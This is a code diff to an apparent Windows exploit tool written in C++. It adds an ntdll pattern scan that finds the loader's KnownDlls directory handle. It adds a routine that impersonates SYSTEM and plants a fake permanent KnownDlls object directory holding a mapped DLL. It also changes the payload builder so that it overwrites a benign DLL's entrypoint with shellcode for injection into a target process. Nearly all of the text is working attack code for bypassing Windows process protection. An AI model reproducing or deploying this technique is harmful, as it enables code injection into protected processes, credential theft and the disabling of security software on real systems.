@@ -3,13 +3,54 @@
 
 #define _CRT_SECURE_NO_WARNINGS
 #include <stdio.h>
+#include <intrin.h>
 #include "Payload.h"
+#include "exploit.h"
 #include "utils.h"
 #include "resource.h"
 #include "..\\InjectShellcode\\InjectShellcode.h"
 #include <DbgHelp.h>
 
 #pragma comment(lib, "Dbghelp.lib")
+
+extern PROCESS_INFORMATION pi;
+extern HANDLE hKnownDllsObjDir;
+
+PVOID FindAddressByPattern(PCHAR Name, PWCHAR ModuleName, PBYTE Pattern, unsigned int Size)
+{
+    PVOID Address = NULL;
+    HMODULE Base = GetModuleHandle(ModuleName);
+
+    if (!Base)
+    {
+        PrintVerbose(L"Failed to locate %s.\n", ModuleName);
+        return NULL;
+    }
+
+    PBYTE Function = (PBYTE)GetProcAddress(Base, Name);
+
+    if (!Function)
+    {
+        PrintVerbose(L"Failed to resolve %s.\n", Name);
+        return NULL;
+    }
+
+    for (unsigned int i = 0; i < 100; i++)
+    {
+        if (!memcmp((PVOID)&Function[i], Pattern, Size))
+        {
+            Address = (PVOID)((PBYTE)&Function[i] + *(DWORD*)((PBYTE)&Function[i] + Size) + Size + 4);
+            break;
+        }
+    }
+
+    if (Address)
+        PrintVerbose(L"Found %s address: %p (base 0x%p)\n", Name, Address, Base);
+    else
+        PrintVerbose(L"Failed to match pattern - address not found");
+
+    return Address;
+}
 
 bool InitShellcodeParams(
     PSHELLCODE_PARAMS pParams
@@ -33,21 +74,26 @@ bool InitShellcodeParams(
         return false;
     }
 
+    BYTE MovRdi[] = {0x48, 0x8B, 0x3D};
+    pParams->pLdrpKnownDllDirectoryHandle = (PHANDLE)FindAddressByPattern((PCHAR)"LdrGetKnownDllSectionHandle", (PWCHAR)L"ntdll", MovRdi, sizeof(MovRdi));
+
 #define REQUIRE_IMPORT(p) if (!(p)) { goto IMPORT_FAILURE; }
 
     // Target process should already have ntdll and kernel32 loaded, so we can just pass pointers over
-    
+
     // ntdll
-    REQUIRE_IMPORT(pParams->pNtOpenProcess = (NtOpenProcess_t)GetProcAddress(hNtdll, "NtOpenProcess"));
-    REQUIRE_IMPORT(pParams->pNtTerminateProcess = (NtTerminateProcess_t)GetProcAddress(hNtdll, "NtTerminateProcess"));
     REQUIRE_IMPORT(pParams->pRtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(hNtdll, "RtlAdjustPrivilege"));
+    REQUIRE_IMPORT(pParams->pNtOpenProcess = (NtOpenProcess_t)GetProcAddress(hNtdll, "NtOpenProcess"));
+    REQUIRE_IMPORT(pParams->pNtDuplicateObject = (NtDuplicateObject_t)GetProcAddress(hNtdll, "NtDuplicateObject"));
     REQUIRE_IMPORT(pParams->pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory"));
+    REQUIRE_IMPORT(pParams->pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(hNtdll, "NtProtectVirtualMemory"));
     REQUIRE_IMPORT(pParams->pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hNtdll, "NtWriteVirtualMemory"));
     REQUIRE_IMPORT(pParams->pRtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(hNtdll, "RtlCreateUserThread"));
     REQUIRE_IMPORT(pParams->pNtWaitForSingleObject = (NtWaitForSingleObject_t)GetProcAddress(hNtdll, "NtWaitForSingleObject"));
     REQUIRE_IMPORT(pParams->pNtSetInformationProcess = (NtSetInformationProcess_t)GetProcAddress(hNtdll, "NtSetInformationProcess"));
+    REQUIRE_IMPORT(pParams->pNtTerminateProcess = (NtTerminateProcess_t)GetProcAddress(hNtdll, "NtTerminateProcess"));
 
-	// kernel32
+    // kernel32
     REQUIRE_IMPORT(pParams->pLoadLibraryW = (LoadLibraryW_t)GetProcAddress(hKernel32, "LoadLibraryW"));
     REQUIRE_IMPORT(pParams->pGetLastError = (GetLastError_t)GetProcAddress(hKernel32, "GetLastError"));
 
@@ -58,7 +104,7 @@ IMPORT_FAILURE:
     return false;
 }
 
-// Finds the address within buf of the image entrypoint 
+// Finds the address within buf of the image entrypoint
 PVOID FindEntrypointVA(const std::string& buf)
 {
     PVOID pBase = (PVOID)buf.data();
@@ -133,12 +179,52 @@ bool WriteShellcode(LPCWSTR lpResourceName, PVOID pBuf, SIZE_T maxLength, DWORD&
     return true;
 }
 
+HANDLE CreateFakeKnownDllsDirectory(LPWSTR DllFullPath, LPWSTR* ppwszTargetFile)
+{
+    HANDLE hFakeDir = NULL;
+    HANDLE hTargetDllSection = NULL;
+    HANDLE hFile = INVALID_HANDLE_VALUE;
+    HANDLE hSection = NULL;
+    UNICODE_STRING dirName;
+    OBJECT_ATTRIBUTES oaDir;
+    LARGE_INTEGER zeroSize = {0};
+
+    HANDLE hSystemToken = NULL;
+    if (!ImpersonateSystem(&hSystemToken))
+    {
+        PrintVerbose(L"CreateFakeKnownDllsDirectory: failed to impersonate system\n");
+        return NULL;
+    }
+
+    wchar_t dirString[] = L"\\GLOBAL??\\KnownDlls";
+    RtlInitUnicodeString(&dirName, dirString);
+    RtlZeroMemory(&oaDir, sizeof(oaDir));
+    InitializeObjectAttributes(&oaDir, &dirName, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT, NULL, NULL);
+
+    NTSTATUS st = NtCreateDirectoryObject(&hFakeDir, DIRECTORY_ALL_ACCESS, &oaDir);
+    if (!NT_SUCCESS(st))
+    {
+        PrintVerbose(L"CreateFakeKnownDllsDirectory: failed to create %ws: 0x%x\n", dirString, st);
+        RevertToSelf();
+        return NULL;
+    }
+
+    MapTargetDll(DllFullPath, NULL, hFakeDir, &hTargetDllSection, ppwszTargetFile, TRUE);
+
+    RevertToSelf();
+
+    SetHandleInformation(hFakeDir, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
+
+    PrintVerbose(L"Fake directory handle for inheritance: %p\n", hFakeDir);
+    return hFakeDir;
+}
+
 // Find DLL entrypoint and overwrite it with shellcode
 bool BuildPayload(
-    HANDLE hBenignDll, 
+    HANDLE hBenignDll,
     std::string & payloadBuffer,
     DWORD dwTargetProcessId,
-	LPWSTR pwszDllPath)
+    LPWSTR pwszDllPath)
 {
     std::string buf;
     LARGE_INTEGER dllSize = { 0, };
@@ -155,7 +241,7 @@ bool BuildPayload(
     GetFileSizeEx(hBenignDll, &dllSize);
     buf.resize(dllSize.QuadPart);
 
-    if (!ReadFile(hBenignDll, &buf[0], dllSize.LowPart, &dwBytesRead, NULL) || 
+    if (!ReadFile(hBenignDll, &buf[0], dllSize.LowPart, &dwBytesRead, NULL) ||
         (dwBytesRead != dllSize.QuadPart))
     {
         PrintVerbose(L"BuildPayload: ReadFile failed with GLE %u\n", GetLastError());
@@ -195,9 +281,16 @@ bool BuildPayload(
 
     params.mySize = curOffset + sizeof(params);
     params.dwPid = dwTargetProcessId;
-	wcsncpy(params.dllName, pwszDllPath, wcslen(pwszDllPath)+1);
+    LPWSTR pwszTargetFile = NULL;
+    params.DirHandle = CreateFakeKnownDllsDirectory(pwszDllPath, &pwszTargetFile);
+    LPCWSTR pwszBaseName = pwszTargetFile;
+    LPCWSTR lastBackslash = wcsrchr(pwszTargetFile, L'\\');
+    if (lastBackslash)
+        pwszBaseName = lastBackslash + 1;
+    if (pwszTargetFile)
+        wcsncpy(params.dllName, pwszTargetFile, wcslen(pwszTargetFile)+1);
 
-    PrintVerbose(L"Target PID is %u\n", params.dwPid);
+    PrintVerbose(L"Target PID is %u, object directory handle 0x%p\n", params.dwPid, params.DirHandle);
 
     memcpy((pEntrypoint) + curOffset, &params, sizeof(params));
 
